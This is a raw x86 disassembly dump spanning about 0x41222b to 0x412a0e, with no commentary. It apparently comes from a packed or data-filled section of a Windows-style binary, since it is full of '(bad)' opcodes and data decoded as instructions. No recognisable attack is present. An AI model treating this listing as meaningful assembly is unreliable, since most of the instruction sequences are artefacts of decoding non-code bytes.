  41222b:	xor    bl,bh
  41222d:	in     al,dx
  41222e:	jno    0x4121db
  412230:	outs   dx,BYTE PTR ds:[esi]
  412231:	mov    cl,0xa1
  412233:	cmp    al,0xd
  412235:	mov    al,0xd6
  412237:	fnstcw WORD PTR [edx+0x67]
  41223a:	nop
  41223b:	dec    ebp
  41223c:	(bad)  
  41223d:	mov    edx,0x2d6f1ba9
  412242:	mov    ch,0xde
  412244:	push   ss
  412245:	fsub   st(2),st
  412248:	xchg   BYTE PTR [eax],al
  41224a:	add    BYTE PTR [ebp+0x39],al
  41224d:	add    BYTE PTR [eax],al
  41224f:	mov    al,ds:0x5015
  412254:	add    al,0xba
  412256:	hlt    
  412257:	xor    DWORD PTR [edi+0x188eaeff],ecx
  41225d:	out    0xcf,eax
  41225f:	sub    BYTE PTR [ebp+0x276d9f04],bl
  412265:	popa   
  412266:	pop    esi
  412267:	mov    edi,DWORD PTR ds:0x9a9a73
  41226d:	add    BYTE PTR [eax],al
  41226f:	mov    dl,0x93
  412271:	cs pop edi
  412273:	jp     0x4122ec
  412275:	in     eax,0xf6
  412277:	test   BYTE PTR [eax+0x15],bl
  41227a:	adc    al,0xbb
  41227c:	pop    esp
  41227d:	inc    eax
  41227e:	xor    DWORD PTR [ebx],ecx
  412280:	xor    eax,0xd075e6b1
  412285:	jo     0x4122f5
  412287:	sub    ebp,0x55e3a1
  41228d:	add    cl,cl
  41228f:	hlt    
  412290:	pop    eax
  412291:	add    BYTE PTR [eax],al
  412293:	add    BYTE PTR [edi],cl
  412295:	(bad)  
  412296:	(bad)  
  412297:	(bad)  
  412298:	(bad)  
  412299:	(bad)  
  41229a:	(bad)  
  41229b:	(bad)  
  41229c:	movlps QWORD PTR [esi],xmm6
  41229f:	mov    edx,0x0
  4122a4:	add    BYTE PTR [eax],al
  4122a6:	add    BYTE PTR [eax],al
  4122a8:	add    al,al
  4122aa:	rcl    BYTE PTR [edx+0x39],0xa7
  4122ae:	or     BYTE PTR [ebp+ecx*1+0x28d3c9d8],0x78
  4122b6:	pushf  
  4122b7:	adc    BYTE PTR [ecx-0x7e],dl
  4122ba:	int3   
  4122bb:	mov    ebx,0x38ccb780
  4122c0:	mov    esi,0xc0c0163f
  4122c5:	shl    BYTE PTR [ebp+0x6e],cl
  4122c8:	outs   dx,BYTE PTR ds:[esi]
  4122c9:	dec    ebp
  4122ca:	jb     0x41233b
  4122cc:	arpl   WORD PTR [eax],sp
  4122ce:	ins    DWORD PTR es:[edi],dx
  4122cf:	outs   dx,DWORD PTR ds:[esi]
  4122d0:	je     0x41231f
  4122d2:	or     eax,0x736e724d
  4122d7:	ins    DWORD PTR es:[edi],dx
  4122d8:	cmp    al,0x72
  4122da:	and    BYTE PTR [esp+ebp*2+0x75],dh
  4122de:	push   eax
  4122df:	jb     0x41235a
  4122e1:	inc    edi
  4122e2:	or     ah,BYTE PTR [edx+0x6f]
  4122e5:	jb     0x412342
  4122e7:	or     eax,0x6d656520
  4122ec:	or     eax,0x6d642065
  4122f1:	ins    DWORD PTR es:[edi],dx
  4122f2:	and    BYTE PTR [ebp+0x72],ah
  4122f5:	jb     0x412317
  4122f7:	cmp    al,0x72
  4122f9:	outs   dx,BYTE PTR ds:[esi]
  4122fa:	gs cmp eax,0xa702072
  412300:	data16 outs dx,BYTE PTR ds:[esi]
  412302:	and    BYTE PTR [esi],ch
  412304:	gs push esi
  412306:	ins    DWORD PTR es:[edi],dx
  412307:	ins    DWORD PTR es:[edi],dx
  412308:	and    BYTE PTR [ecx+0x76],ah
  41230b:	ins    DWORD PTR es:[edi],dx
  41230c:	arpl   WORD PTR [edx],sp
  41230e:	ins    DWORD PTR es:[edi],dx
  41230f:	dec    ebp
  412310:	arpl   WORD PTR [edx+0x3e],si
  412313:	imul   esi,DWORD PTR [eax+eiz*1+0x6e],0x6e6c7965
  41231b:	cmp    al,0x3c
  41231d:	and    BYTE PTR [ebp+0x20],ah
  412320:	je     0x412387
  412322:	ins    BYTE PTR es:[edi],dx
  412323:	and    dh,BYTE PTR [ebx+0x20]
  412326:	dec    ebp
  412327:	and    BYTE PTR [esi+0x65],ch
  41232a:	dec    esp
  41232b:	rol    al,0xcd
  41232e:	ffree  st(0)
  412330:	ror    BYTE PTR [ecx-0x5c],0x89
  412334:	xor    edi,esi
  412336:	ds enter 0xd2e8,0xb7
  41233b:	jns    0x41233f
  41233d:	cmp    eax,0x935caf58
  412342:	in     eax,dx
  412343:	pop    edi
  412344:	fisttp DWORD PTR [edx+ebx*4-0x52]
  412348:	pop    ecx
  412349:	rol    BYTE PTR [eax],0x1e
  41234c:	retf   
  41234d:	push   ds
  41234e:	and    al,BYTE PTR [eax]
  412350:	add    BYTE PTR [eax],al
  412352:	jno    0x412309
  412354:	jbe    0x412341
  412356:	(bad)  
  412358:	push   ds
  412359:	add    bp,cx
  41235c:	test   eax,0x3cacef88
  412361:	or     eax,0x85bd44bb
  412366:	cmp    al,0xaf
  412368:	outs   dx,DWORD PTR ds:[esi]
  412369:	add    cl,BYTE PTR [esi]
  41236b:	test   ecx,ebx
  41236d:	bound  eax,QWORD PTR [ecx+0x43]
  412370:	or     al,0x7d
  412372:	mov    esi,0x9d14
  412377:	pushf  
  412378:	repz add BYTE PTR [eax],al
	...
  412383:	add    BYTE PTR [eax],al
  412385:	cld    
  412386:	into   
  412387:	stc    
  412388:	int3   
  412389:	int3   
  41238a:	int3   
  41238b:	int3   
  41238c:	int3   
  41238d:	int3   
  41238e:	int3   
  41238f:	int3   
  412390:	int3   
  412391:	rol    al,0xc5
  412394:	scas   al,BYTE PTR es:[edi]
  412395:	push   es
  412396:	scas   eax,DWORD PTR es:[edi]
  412397:	fwait
  412398:	sbb    ch,BYTE PTR ss:[ebx+0x11]
  41239c:	xchg   ecx,eax
  41239d:	inc    ebx
  41239e:	pop    ds
  41239f:	sbb    BYTE PTR [eax],ch
  4123a1:	mov    edx,ebp
  4123a3:	ja     0x41237b
  4123a5:	xchg   ecx,eax
  4123a6:	ins    DWORD PTR es:[edi],dx
  4123a7:	push   esp
  4123a8:	outs   dx,DWORD PTR ds:[esi]
  4123a9:	pop    esp
  4123aa:	jae    0x41236c
  4123ac:	shl    BYTE PTR [edx],0xb5
  4123af:	cs hlt 
  4123b1:	mov    eax,ds:0x82f7be41
  4123b6:	or     DWORD PTR [ecx+0x18d64860],ebx
  4123bc:	mov    ecx,0xd4cb8e02
  4123c1:	lock iret 
  4123c3:	mov    eax,ds
  4123c5:	stos   BYTE PTR es:[edi],al
  4123c6:	cmc    
  4123c7:	repz mov ?,WORD PTR [edx]
  4123ca:	rol    al,0x6e
  4123cd:	xor    bh,BYTE PTR [esi]
  4123cf:	rol    al,0x35
  4123d2:	int    0x72
  4123d4:	rol    BYTE PTR [edx+edi*4],0xc0
  4123d8:	outs   dx,BYTE PTR ds:[esi]
  4123d9:	cwde   
  4123da:	aas    
  4123db:	lahf   
  4123dc:	test   dl,ah
  4123de:	push   ebx
  4123df:	xchg   esi,eax
  4123e0:	shl    DWORD PTR [esi-0x63],cl
  4123e3:	mov    cl,0x35
  4123e5:	in     al,0xac
  4123e7:	cmp    DWORD PTR [eax],ebx
  4123e9:	mov    eax,0x34abdd0d
  4123ee:	add    al,0x4
  4123f0:	add    al,0xea
  4123f2:	stos   DWORD PTR es:[edi],eax
  4123f3:	add    al,0x4
  4123f5:	mov    esp,edx
  4123f7:	add    al,0x4
  4123f9:	add    al,0x89
  4123fb:	mov    DWORD PTR [ecx-0x76767677],ecx
  412401:	mov    DWORD PTR [ecx+0x4a4d8111],ecx
  412407:	pop    edi
  412408:	sti    
  412409:	dec    esi
  41240a:	aad    0x25
  41240c:	cmp    eax,0xeaa37f9e
  412411:	xor    esi,DWORD PTR [ecx]
  412413:	push   eax
  412414:	into   
  412415:	mov    ds:0x12b6b9b1,eax
  41241a:	mov    ds:0xffffffff,al
  41241f:	(bad)  
  412420:	(bad)  
  412421:	(bad)  
  412422:	(bad)  
  412423:	inc    DWORD PTR [eax]
  412425:	add    BYTE PTR [ebx+0x19],ch
  412428:	cdq    
  412429:	inc    ebp
  41242a:	add    BYTE PTR [eax],al
  41242c:	ds (bad) 
  41242e:	iret   
  41242f:	mov    edx,0xf84665c9
  412434:	repnz xchg esp,eax
  412436:	shl    DWORD PTR [ebx],0x7e
  412439:	and    DWORD PTR [ebp-0x3fd99466],ecx
  41243f:	cmp    DWORD PTR [esi+0x32],ebx
  412442:	ret    
  412443:	push   esi
  412444:	or     ebx,edx
  412446:	hlt    
  412447:	data16 js 0x4124ab
  41244a:	cmp    eax,0x8777ff34
  41244f:	add    BYTE PTR [eax],al
  412451:	std    
  412452:	cmp    DWORD PTR [eax],eax
  412454:	add    BYTE PTR [edi+0x26],ah
  412457:	nop
  412458:	add    BYTE PTR [eax],al
  41245a:	stc    
  41245b:	xchg   BYTE PTR ds:0x3badecf4,al
  412461:	imul   DWORD PTR [ebp+0x1f]
  412464:	pop    esp
  412465:	mov    ds:0xde974209,eax
  41246a:	xchg   BYTE PTR [eax+0x4a7ff17d],ah
  412470:	outs   dx,DWORD PTR ds:[esi]
  412471:	mov    edi,0x33000000
  412476:	xor    dl,dl
  412478:	jle    0x4124c2
  41247a:	and    eax,0x2aefaf01
  41247f:	add    eax,0x88f6f893
  412484:	pop    ecx
  412485:	out    0x58,al
  412487:	sub    esi,esp
  412489:	and    BYTE PTR [eax+0x32],dl
  41248c:	rcl    BYTE PTR [edx+0x55],0x34
  412490:	(bad)  
  412491:	jl     0x412493
  412493:	add    BYTE PTR [esi+0x56],ah
  412496:	int    0x0
  412498:	add    BYTE PTR [eax],al
  41249a:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4124a0:	mov    ecx,DWORD PTR [ebx-0x5638d575]
  4124a6:	(bad)  
  4124a7:	(bad)  
  4124a8:	(bad)  
  4124a9:	(bad)  
  4124aa:	(bad)  
  4124ab:	(bad)  
  4124ac:	(bad)  
  4124ad:	(bad)  
  4124ae:	inc    DWORD PTR [ebx+0x23d2eb83]
  4124b4:	pop    ecx
  4124b5:	and    dh,dh
  4124b7:	or     edi,DWORD PTR [edi+edx*8+0xb1d677d]
  4124be:	es jne 0x412471
  4124c1:	and    al,0xc1
  4124c3:	(bad)  
  4124c4:	fisubr WORD PTR [ebp+0x45]
  4124c7:	les    eax,FWORD PTR [ecx+0xd188383]
  4124cd:	add    DWORD PTR [ebx-0x7c7cd077],0xffffffdd
  4124d4:	cli    
  4124d5:	cmp    DWORD PTR [edx],ecx
  4124d7:	sub    DWORD PTR [esi-0x57],ecx
  4124da:	lods   al,BYTE PTR ds:[esi]
  4124db:	(bad)  
  4124dc:	mov    bl,0xf7
  4124de:	(bad)  
  4124df:	jbe    0x412485
  4124e1:	icebp  
  4124e2:	or     eax,0x67eb3adc
  4124e7:	dec    ebp
  4124e8:	retf   
  4124e9:	cmc    
  4124ea:	push   edx
  4124eb:	add    DWORD PTR [eax],0x1a
  4124ee:	mov    ebp,0x6e3e
  4124f3:	add    BYTE PTR [edx],al
  4124f5:	adc    edx,ebp
  4124f7:	fadd   DWORD PTR [edx+0x6]
  4124fa:	add    DWORD PTR [edi+eax*8-0x2f],edx
  4124fe:	or     DWORD PTR ss:[eax+ebp*4-0x26b62d05],esi
  412506:	or     BYTE PTR [esi+0x40fcd710],ch
  41250c:	fwait
  41250d:	jl     0x4124a8
  41250f:	adc    eax,0xfd571afe
  412514:	and    dl,BYTE PTR cs:0xcf780000
	...
  412527:	cdq    
  412528:	cmc    
  412529:	jl     0x412513
  41252b:	call   0xe92a0e18
  412530:	call   0x410e1d
  412535:	sbb    ch,BYTE PTR [ecx]
  412537:	dec    edi
  412538:	sbb    DWORD PTR [esi+0x4b],ebx
  41253b:	jbe    0x4125a3
  41253d:	nop    DWORD PTR [ecx]
  412540:	fcmovb st,st(4)
  412542:	add    eax,DWORD PTR [ebx-0x7f]
  412545:	clc    
  412546:	fcom   st(0)
  412548:	ret    
  412549:	aas    
  41254a:	shl    DWORD PTR [edi],0xcd
  41254d:	(bad)  
  41254e:	(bad)  
  41254f:	out    dx,al
  412550:	dec    DWORD PTR [ebx+0x7f]
  412553:	inc    ebx
  412554:	pop    ecx
  412555:	pop    ss
  412556:	jnp    0x4125d0
  412558:	js     0x41254d
  41255a:	push   ebp
  41255b:	jo     0x4124ea
  41255d:	popf   
  41255e:	add    al,0xb
  412560:	sbb    edx,ebp
  412562:	int    0x3a
  412564:	enter  0x1a71,0x58
  412568:	jne    0x412511
  41256a:	pushf  
  41256b:	fdivp  st(7),st
  41256d:	dec    DWORD PTR [ebx-0xddde]
  412573:	imul   eax,DWORD PTR [edx+edi*4+0x52f5e8ff],0xffffffd5
  41257b:	push   esp
  41257c:	xor    eax,0x833be8e
  412581:	pusha  
  412582:	xchg   BYTE PTR [eax+eax*8],dh
  412585:	xor    eax,0xf544f0a2
  41258a:	mov    al,0x9
  41258c:	or     BYTE PTR [ebx-0x1717f438],cl
  412592:	call   0xe929bcea
  412597:	add    dl,BYTE PTR [eax-0x171718]
  41259d:	(bad)  
  41259e:	(bad)  
  41259f:	(bad)  
  4125a0:	(bad)  
  4125a1:	(bad)  
  4125a2:	(bad)  
  4125a3:	(bad)  
  4125a4:	call   DWORD PTR [ecx+eiz*1]
  4125a7:	sbb    dh,dh
  4125a9:	ror    dl,cl
  4125ab:	test   al,0x6a
  4125ad:	jo     0x4125fe
  4125af:	mov    dl,0x5a
  4125b1:	into   
  4125b2:	gs popa 
  4125b4:	jbe    0x4125db
  4125b6:	scas   al,BYTE PTR es:[edi]
  4125b7:	jno    0x41257e
  4125b9:	xchg   ecx,eax
  4125ba:	cmp    al,0xb8
  4125bc:	shr    eax,1
  4125be:	call   0xe92a0eab
  4125c3:	call   0x410eb0
  4125c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125c9:	add    al,0x37
  4125cb:	or     al,0xff
  4125cd:	inc    DWORD PTR [ebx-0xf]
  4125d0:	addr16 fcmovu st,st(6)
  4125d3:	loope  0x4125e5
  4125d5:	imul   edi,DWORD PTR [eax],0xffffffc6
  4125d8:	das    
  4125d9:	jmp    0x612a:0x3110f898
  4125e0:	shl    BYTE PTR [ebp-0x7b],1
  4125e3:	mov    al,ds:0x3427ff63
  4125e8:	or     al,0xad
  4125ea:	enter  0xd786,0x6a
  4125ee:	sbb    DWORD PTR [ebx+0x4b],ebp
  4125f1:	(bad)  
  4125f2:	jmp    DWORD PTR [ecx+0x3f]
  4125f5:	(bad)  
  4125f6:	call   DWORD PTR [ecx+0x77]
  4125f9:	mov    cl,0xff
  4125fb:	jmp    FWORD PTR [esi]
  4125fd:	rcl    cl,1
  4125ff:	add    eax,0x8ebb2c39
  412604:	jae    0x4125f1
  412606:	je     0x41258a
  412608:	pop    esi
  412609:	call   0x4645d94a
  41260e:	gs gs je 0x412664
  412612:	bound  ebp,QWORD PTR gs:[ebp+0x63]
  412616:	outs   dx,BYTE PTR ds:[esi]
  412617:	outs   dx,BYTE PTR ds:[esi]
  412618:	or     eax,0x6d702230
  41261d:	jb     0x412684
  41261f:	jb     0x412641
  412621:	outs   dx,BYTE PTR ds:[esi]
  412622:	bound  esp,QWORD PTR [ebp+0x3c]
  412625:	and    ah,BYTE PTR [edx+0x61]
  412628:	imul   esp,DWORD PTR [ebp+0x6d],0x746e632e
  41262f:	and    BYTE PTR [esi+0x53],ch
  412632:	ins    DWORD PTR es:[edi],dx
  412633:	je     0x4126a2
  412635:	cmp    eax,0x65622072
  41263a:	gs popa 
  41263c:	gs inc ecx
  41263e:	jbe    0x4126a9
  412640:	arpl   WORD PTR ds:0x616f202e,cx
  412646:	cmp    al,0x75
  412648:	ins    DWORD PTR es:[edi],dx
  412649:	je     0x41266b
  41264b:	jae    0x4126bd
  41264d:	push   edi
  41264e:	arpl   WORD PTR [ebx+0x65],dx
  412651:	ds jae 0x4126bb
  412654:	inc    ebp
  412655:	gs jb  0x4126be
  412658:	gs ins DWORD PTR es:[edi],dx
  41265a:	and    cl,BYTE PTR [ebp+0x65]
  41265d:	cs jo  0x412680
  412660:	jb     0x41269e
  412662:	outs   dx,DWORD PTR ds:[esi]
  412663:	outs   dx,DWORD PTR ds:[esi]
  412664:	fs jb  0x412696
  412667:	jb     0x4126ce
  412669:	outs   dx,DWORD PTR gs:[esi]
  41266b:	bound  esp,QWORD PTR [eax]
  41266d:	jb     0x4126d5
  41266f:	je     0x41269f
  412671:	popa   
  412672:	and    BYTE PTR [ecx+0x64],ah
  412675:	jb     0x4126e0
  412677:	or     eax,0x6d656369
  41267c:	gs gs ins BYTE PTR es:[edi],dx
  41267f:	jb     0x4126ea
  412681:	je     0x4126a3
  412683:	jb     0x4126d8
  412685:	ins    DWORD PTR es:[edi],dx
  412686:	and    BYTE PTR [ebx-0x28],dl
  412689:	jnp    0x412690
  41268b:	mov    al,0x66
  41268d:	xor    bh,bh
  41268f:	(bad)  
  412690:	push   DWORD PTR [edi+eiz*8]
  412693:	mov    ah,0x4b
  412695:	imul   esi,DWORD PTR [edx+edi*2-0x50],0x78303bf9
  41269d:	mov    bh,0x69
  41269f:	ds cmp eax,0xbe0671f7
  4126a5:	inc    edi
  4126a6:	add    eax,DWORD PTR [ebx-0x76]
  4126a9:	in     al,dx
  4126aa:	rcl    eax,1
  4126ac:	jmp    0x4126a4
  4126ae:	(bad)  
  4126af:	push   DWORD PTR [ebx+edx*4]
  4126b2:	mov    ecx,0xffffffff
  4126b7:	(bad)  
  4126b8:	(bad)  
  4126b9:	(bad)  
  4126ba:	(bad)  
  4126bb:	(bad)  
  4126bc:	(bad)  
  4126bd:	(bad)  
  4126be:	call   edx
  4126c0:	sub    eax,DWORD PTR [ebx]
	...
  4126ca:	add    BYTE PTR [edi],cl
  4126cc:	paddd  mm0,QWORD PTR [edx-0x111796db]
  4126d3:	fcmovu st,st(3)
  4126d5:	daa    
  4126d6:	(bad)  [edx+0x562feeae]
  4126dc:	cmp    eax,0x1a75b7e4
  4126e1:	enter  0x95c3,0x66
  4126e5:	(bad)  
  4126e6:	psrad  mm6,QWORD PTR [ebx+0xf]
  4126ea:	(bad)  
  4126ec:	fimul  WORD PTR [edi]
  4126ee:	movzx  esi,dh
  4126f1:	data16 ror BYTE PTR [ebp+0x336d7b98],1
  4126f8:	repnz cmc 
  4126fa:	cmp    eax,0x7cb35cf
  4126ff:	sub    ah,cl
  412701:	dec    esp
  412702:	sbb    al,ah
  412704:	nop
  412705:	mov    ebx,0x63850f11
  41270a:	adc    dh,BYTE PTR [edi]
  41270c:	cdq    
  41270d:	test   DWORD PTR [ebp-0x311e6f7b],eax
  412713:	in     al,0x4f
  412715:	adc    cl,BYTE PTR [edx+edx*2-0x3b21ba92]
  41271c:	or     ecx,edi
  41271e:	sysret 
  412720:	sbb    ah,BYTE PTR [esp+ebp*4+0x4297b12d]
  412727:	dec    edx
  412728:	push   cs
  412729:	jecxz  0x4126cc
  41272b:	sbb    eax,0xda043ec9
  412730:	push   esi
  412731:	pop    edi
  412732:	sbb    eax,0x7cbb8585
  412737:	test   DWORD PTR [ebp-0x7676767b],eax
  41273d:	mov    DWORD PTR [ecx-0x76767677],ecx
  412743:	hlt    
  412744:	mov    edi,0x75757536
  412749:	jne    0x4127c0
  41274b:	jne    0x4127c2
  41274d:	jne    0x4127c4
  41274f:	add    BYTE PTR [eax],al
  412751:	xor    DWORD PTR [eax],ebx
  412753:	mov    DWORD PTR [esi-0x15],ecx
  412756:	lahf   
  412757:	and    al,0x1b
  412759:	cwde   
  41275a:	xlat   BYTE PTR ds:[ebx]
  41275b:	repz fs pop edi
  41275e:	adc    cl,dl
  412760:	jbe    0x412774
  412762:	fs (bad) 
  412764:	mov    WORD PTR [edx+ecx*8+0x42],?
  412768:	test   eax,0xff8a0000
  41276d:	cmp    DWORD PTR [edx-0x7d],esp
  412770:	fidiv  WORD PTR [edx+0x20]
  412773:	(bad)  
  412774:	lea    edi,[edi+0x31]
  412777:	hlt    
  412778:	rcr    esp,0xf2
  41277b:	pop    esp
  41277c:	xor    al,0xcf
  41277e:	data16 add al,dh
  412781:	mov    ds:0x56985e2e,eax
  412786:	lock loop 0x412789
  412789:	add    BYTE PTR [eax],dl
  41278b:	imul   esi,DWORD PTR ds:0xf0450000,0xffffff90
  412792:	add    al,al
  412794:	jno    0x4127ae
  412796:	and    eax,0xd412fc83
  41279b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41279c:	cmp    al,0xfd
  41279e:	jb     0x4127c5
  4127a0:	inc    ebx
  4127a1:	rol    DWORD PTR [ebp-0x66b9392e],cl
  4127a7:	mov    eax,ds:0x30e5c65
  4127ac:	rol    al,0xc0
  4127af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b0:	mov    eax,0xc08302c0
  4127b6:	rol    al,0x24
  4127b9:	and    al,0x24
  4127bb:	and    al,0x24
  4127bd:	and    al,0x24
  4127bf:	and    al,0x24
  4127c1:	fwait
  4127c2:	adc    cl,BYTE PTR [edx]
  4127c4:	push   ecx
  4127c5:	cwde   
  4127c6:	and    dh,BYTE PTR [ecx]
  4127c8:	dec    ebx
  4127c9:	and    al,0xbd
  4127cb:	cmp    eax,0x191cb969
  4127d0:	xchg   esi,eax
  4127d1:	mov    esp,0x23978b96
  4127d6:	fisub  WORD PTR [ecx-0x74747446]
  4127dc:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4127e2:	mov    ecx,DWORD PTR [ebx-0x481cbf52]
  4127e8:	mov    ecx,DWORD PTR [ebx+0x1bfaddfa]
  4127ee:	ret    
  4127ef:	aaa    
  4127f0:	pop    ebp
  4127f1:	push   0x31
  4127f3:	xchg   ecx,eax
  4127f4:	aad    0x7e
  4127f6:	loope  0x4127a3
  4127f8:	push   esi
  4127f9:	push   ecx
  4127fa:	in     al,dx
  4127fb:	ret    0x708f
  4127fe:	xor    al,0x5d
  412800:	inc    edi
  412801:	pop    ss
  412802:	sti    
  412803:	hlt    
  412804:	jnp    0x4127e2
  412806:	mov    ds:0x1496c6cc,eax
  41280b:	jecxz  0x4127b8
  41280d:	mov    ecx,DWORD PTR [ebx-0x7474425f]
  412813:	mov    eax,ds:0x8bf37a
  412818:	mov    ecx,0xcbbc989e
  41281d:	stos   DWORD PTR es:[edi],eax
  41281e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41281f:	xor    eax,0xc47e3091
  412824:	cmp    BYTE PTR [edi+0x30],bl
  412827:	xchg   ebx,eax
  412828:	jne    0x4127ea
  41282a:	lahf   
  41282b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41282c:	cmp    BYTE PTR [edx+0x5c85],cl
  412832:	add    BYTE PTR [edx-0x76],dl
  412835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412836:	pop    edx
  412837:	cmp    eax,0x12b34ea1
  41283c:	iret   
  41283d:	loopne 0x4128a4
  41283f:	addr16 cdq 
  412841:	dec    ebp
  412842:	push   cs
  412843:	sub    edx,DWORD PTR [esi]
  412845:	cmp    dl,dh
  412847:	pop    es
  412848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412849:	push   ds
  41284a:	es retf 0x66
  41284e:	and    dl,BYTE PTR [ebp+0x0]
  412851:	add    BYTE PTR [ecx],cl
  412853:	xchg   DWORD PTR [esi+0x0],ebp
	...
  412861:	or     al,0x47
  412863:	mov    dh,0xff
  412865:	(bad)  
  412866:	(bad)  
  412867:	(bad)  
  412868:	(bad)  
  412869:	(bad)  
  41286a:	(bad)  
  41286b:	(bad)  
  41286c:	push   DWORD PTR [esp+esi*2+0x34]
  412870:	jmp    FWORD PTR [ecx-0x5b6ddc44]
  412876:	mov    bl,0x98
  412878:	mov    cl,0x32
  41287a:	and    DWORD PTR ds:0x6de1e930,edx
  412880:	adc    DWORD PTR [ecx-0x5e0b34e4],edi
  412886:	jle    0x4128fc
  412888:	je     0x41287a
  41288a:	ins    BYTE PTR es:[edi],dx
  41288b:	je     0x412901
  41288d:	call   0x7504:0xd17474fc
  412894:	or     bl,bl
  412896:	outs   dx,DWORD PTR ds:[esi]
  412897:	mov    edi,0xe473d31c
  41289c:	xchg   esi,eax
  41289d:	retf   0x5068
  4128a0:	call   0x44bda38a
  4128a5:	jecxz  0x412850
  4128a7:	in     al,dx
  4128a8:	cdq    
  4128a9:	je     0x4128b3
  4128ab:	stc    
  4128ac:	adc    edi,DWORD PTR ds:0x8080896
  4128b2:	ins    BYTE PTR es:[edi],dx
  4128b3:	into   
  4128b4:	lahf   
  4128b5:	std    
  4128b6:	lds    ebp,FWORD PTR ds:0x4d868fea
  4128bc:	sbb    edi,DWORD PTR [ecx+0x2f]
  4128bf:	sub    al,0x88
  4128c1:	ins    DWORD PTR es:[edi],dx
  4128c2:	cmp    al,BYTE PTR [edi+0x1d020f80]
  4128c8:	mov    dl,0xd8
  4128ca:	lea    esp,[edi]
  4128cc:	xchg   ebp,eax
  4128cd:	xchg   dl,bh
  4128cf:	(bad)  
  4128d0:	scas   al,BYTE PTR es:[edi]
  4128d1:	cli    
  4128d2:	or     eax,0x808c7b8
  4128d7:	in     eax,0xa2
  4128d9:	or     BYTE PTR [eax],cl
  4128db:	or     al,ch
  4128dd:	call   0xe92a11ca
  4128e2:	call   0x5fd011cf
  4128e7:	lock push 0x6a
  4128ea:	push   0x6a
  4128ec:	push   0x6a
  4128ee:	push   0x6a
  4128f0:	push   0xffffffff
  4128f2:	(bad)  
  4128f3:	jle    0x4128a6
  4128f5:	popa   
  4128f6:	fadd   DWORD PTR [ebp-0x24]
  4128f9:	je     0x412933
  4128fb:	sahf   
  4128fc:	push   0x9a2d142b
  412901:	pop    edx
  412902:	mov    ah,0xfc
  412904:	mov    ecx,0x27303a1e
  412909:	mov    bl,0x40
  41290b:	(bad)  
  41290c:	call   DWORD PTR [eax+ebp*2-0x5908226b]
  412913:	fisttp DWORD PTR [ebp-0x534693a9]
  412919:	jb     0x41296f
  41291b:	fstp   TBYTE PTR [eax-0x3227e53]
  412921:	and    DWORD PTR [ebx],eax
  412923:	or     BYTE PTR [edi+eiz*8],bl
  412926:	test   DWORD PTR [edx+0x51],ebx
  412929:	(bad)  
  41292a:	(bad)  
  41292b:	(bad)  
  41292c:	cmp    eax,0xffffb69e
  412931:	xchg   esp,eax
  412932:	in     al,dx
  412933:	(bad)  
  412935:	(bad)  
  412936:	jle    0x412988
  412938:	push   ss
  412939:	enter  0x215e,0x44
  41293d:	std    
  41293e:	js     0x412901
  412940:	nop
  412941:	cmc    
  412942:	dec    DWORD PTR [edx-0xd]
  412945:	cmc    
  412946:	pop    eax
  412947:	push   edi
  412948:	(bad)  
  412949:	mov    ebx,0xb0fa5643
  41294e:	(bad)  
  41294f:	(bad)  
  412950:	(bad)  
  412951:	mov    eax,0xbffff10
  412956:	adc    bh,bh
  412958:	(bad)  
  412959:	dec    DWORD PTR [ebx-0x74747475]
  41295f:	mov    ecx,DWORD PTR [ebx+0x30568b8b]
  412965:	add    esi,DWORD PTR [eax+0x3c]
  412968:	mov    BYTE PTR [ebp+0x6b],ah
  41296b:	push   cs
  41296c:	jl     0x41293f
  41296e:	jg     0x4129b0
  412970:	(bad)  
  412971:	mov    WORD PTR [eax],cs
  412973:	ins    BYTE PTR es:[edi],dx
  412974:	arpl   dx,si
  412976:	(bad)  
  412977:	xor    DWORD PTR [ecx-0x74749429],ecx
  41297d:	mov    ecx,DWORD PTR [ebx-0x74747475]
  412983:	mov    eax,eax
  412985:	rcr    ah,0x37
  412988:	fisubr DWORD PTR [ebx-0x11f63f40]
  41298e:	cld    
  41298f:	inc    edi
  412990:	jge    0x41295b
  412992:	or     ch,0xc2
  412995:	inc    edi
  412996:	mov    dh,0x97
  412998:	out    dx,eax
  412999:	mov    bl,0x69
  41299b:	fstp   QWORD PTR ds:0x25176420
  4129a1:	mov    esp,0xf530ce7e
  4129a6:	sahf   
  4129a7:	xchg   esi,eax
  4129a8:	jae    0x412993
  4129aa:	lds    ecx,FWORD PTR [ebp+0x24]
  4129ad:	sub    BYTE PTR [edi-0x9e33f40],0xc0
  4129b4:	rcr    BYTE PTR [ebp+0xc0afc4],0x3f
  4129bb:	ret    0x46ec
  4129be:	cld    
  4129bf:	xor    al,0xa3
  4129c1:	sti    
  4129c2:	rcl    DWORD PTR [eax+esi*2+0x5ac6dacb],cl
  4129c9:	jae    0x41296c
  4129cb:	pop    ss
  4129cc:	xchg   ecx,eax
  4129cd:	inc    ebx
  4129ce:	push   esi
  4129cf:	xor    BYTE PTR [eax+edx*1-0x4f000000],0xb2
  4129d7:	test   BYTE PTR [ecx],al
  4129d9:	adc    eax,0x7a4ff5f6
  4129de:	jns    0x412985
  4129e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e1:	push   0xd877acbf
  4129e6:	pop    esp
  4129e7:	xchg   esp,eax
  4129e8:	dec    ecx
  4129e9:	pop    edx
  4129ea:	xchg   ecx,eax
  4129eb:	sahf   
  4129ec:	scas   eax,DWORD PTR es:[edi]
  4129ed:	xor    DWORD PTR [ebp+0x72],ebx
  4129f0:	inc    ecx
  4129f1:	fadd   QWORD PTR [eax]
  4129f3:	add    BYTE PTR [ecx],dh
  4129f5:	push   es
  4129f6:	pop    ss
  4129f7:	add    BYTE PTR [eax],al
  4129f9:	add    BYTE PTR [eax],cl
  4129fb:	or     BYTE PTR [eax],cl
  4129fd:	or     BYTE PTR [eax],cl
  4129ff:	or     BYTE PTR [eax],cl
  412a01:	or     BYTE PTR [eax],cl
  412a03:	jb     0x41299e
  412a05:	retf   
  412a06:	push   0x6a
  412a08:	push   0x6a
  412a0a:	push   0x6a
  412a0c:	push   0x6a
  412a0e:	push   0x0
